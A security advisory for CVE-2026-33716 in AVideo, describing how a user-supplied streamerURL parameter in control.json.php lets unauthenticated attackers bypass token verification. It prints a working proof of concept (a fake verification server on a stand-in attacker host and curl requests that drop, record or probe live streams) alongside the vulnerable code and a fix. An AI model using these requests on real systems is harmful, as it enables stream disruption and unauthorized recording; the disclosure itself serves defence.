# [C] AVideo Allows Unauthenticated Live Stream Control via Token Verification URL Override in control.json.php

## Summary
Severity: Critical
Advisory: GHSA-9hv9-gvwm-95f2
CVE: CVE-2026-33716
CWE: CWE-287
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:H (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-9hv9-gvwm-95f2
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The standalone live stream control endpoint at `plugin/Live/standAloneFiles/control.json.php` accepts a user-supplied `streamerURL` parameter that overrides where the server sends token verification requests. An attacker can redirect token verification to a server they control that always returns `{"error": false}`, completely bypassing authentication. This grants unauthenticated control over any live stream on the platform, including dropping active publishers, starting/stopping recordings, and probing stream existence.

## Details

The vulnerability exists because the `streamerURL` parameter is accepted directly from user input with no validation:

**`plugin/Live/standAloneFiles/control.json.php:77-79`** — User input overrides server config:
```php
if (!empty($_REQUEST['streamerURL'])) {
    $streamerURL = $_REQUEST['streamerURL'];
}
```

**`plugin/Live/standAloneFiles/control.json.php:83-91`** — The user-controlled value is assigned to the request object:
```php
$obj->streamerURL = $streamerURL;
```

**`plugin/Live/standAloneFiles/control.json.php:115-126`** — Token verification is sent to the attacker-controlled URL:
```php
$verifyTokenURL = "{$obj->streamerURL}plugin/Live/verifyToken.json.php?token={$obj->token}";
// ...
$content = file_get_contents($verifyTokenURL, false, stream_context_create($arrContextOptions));
```

The legitimate `verifyToken.json.php` performs cryptographic token validation via `Live::decryptHash()` and checks token expiry (12-hour window). By redirecting verification to an attacker server, all of this is bypassed — the attacker's server simply responds with `{"error": false}`.

After authentication is bypassed, the attacker can execute any of the four supported commands (lines 150-186): `record_start`, `record_stop`, `drop_publisher`, and `is_recording`, which issue control commands to the local NGINX RTMP control module.

SSL verification is also explicitly disabled (lines 119-124), meaning the SSRF request will follow any attacker URL without certificate validation.

Notably, the developers were aware of this exact attack pattern and fixed it in the sibling file `standAloneFiles/saveDVR.json.php` on 2026-03-19 with an explicit comment: *"SECURITY: User-supplied webSiteRootURL is intentionally NOT accepted. Allowing it would enable SSRF."* The same fix was not applied to `control.json.php`.

## PoC

**Step 1:** Set up an attacker server that returns `{"error": false}` for all requests.

```bash
# Minimal Python server on attacker machine (attacker.example.com:8888)
python3 -c '
import http.server, json
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type","application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"error": False}).encode())
    def log_message(self, *a): pass
http.server.HTTPServer(("0.0.0.0", 8888), H).serve_forever()
'
```

**Step 2:** Drop a victim's live stream (kill their broadcast):

```bash
curl -s "https://target.example.com/plugin/Live/standAloneFiles/control.json.php?token=anything&command=drop_publisher&name=VICTIM_STREAM_KEY&app=live&streamerURL=http://attacker.example.com:8888/"
```

Expected response (authentication bypassed, command executed):
```json
{"error":false,"msg":"","streamerURL":"http://attacker.example.com:8888/","token":"anything","command":"drop_publisher","app":"live","name":"VICTIM_STREAM_KEY","response":"","requestedURL":"http://localhost:8080/control/drop/publisher?app=live&name=VICTIM_STREAM_KEY"}
```

**Step 3:** Start unauthorized recording of a victim's stream:

```bash
curl -s "https://target.example.com/plugin/Live/standAloneFiles/control.json.php?token=anything&command=record_start&name=VICTIM_STREAM_KEY&app=live&streamerURL=http://attacker.example.com:8888/"
```

**Step 4:** Probe whether a stream name is active:

```bash
curl -s "https://target.example.com/plugin/Live/standAloneFiles/control.json.php?token=anything&command=is_recording&name=GUESS_STREAM_KEY&app=live&streamerURL=http://attacker.example.com:8888/"
```

## Impact

- **Denial of Service on Live Streams:** Any unauthenticated attacker can terminate any active live broadcast using `drop_publisher`, causing immediate disruption for streamers and viewers.
- **Unauthorized Recording:** An attacker can start recording any live stream without authorization using `record_start`, potentially capturing private or sensitive content.
- **Stream Enumeration:** The `is_recording` command allows probing for valid stream names.
- **SSRF:** The server makes an outbound HTTP request to an attacker-controlled URL via `file_get_contents()`, which could be used to scan internal services or exfiltrate data via the request URL.
- **No authentication required:** The entire attack is performed without any credentials.

## Recommended Fix

Remove the `streamerURL` request parameter override entirely, matching the fix already applied in `saveDVR.json.php`. In `plugin/Live/standAloneFiles/control.json.php`, replace lines 77-79:

```php
// BEFORE (vulnerable):
if (!empty($_REQUEST['streamerURL'])) {
    $streamerURL = $_REQUEST['streamerURL'];
}

// AFTER (fixed):
// SECURITY: User-supplied streamerURL is intentionally NOT accepted.
// Allowing it would enable authentication bypass and SSRF via file_get_contents
// on an attacker-controlled host. streamerURL MUST come from the configuration
// file or be hard-coded in this file above.
if (empty($streamerURL)) {
    error_log("control.json.php: streamerURL is not configured");
    die(json_encode(['error' => true, 'msg' => 'Server not configured']));
}
```

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-9hv9-gvwm-95f2
- https://nvd.nist.gov/vuln/detail/CVE-2026-33716
- https://github.com/WWBN/AVideo/commit/388fcd57dbd16f6cb3ebcdf1d08cf2b929941128
- https://github.com/WWBN/AVideo
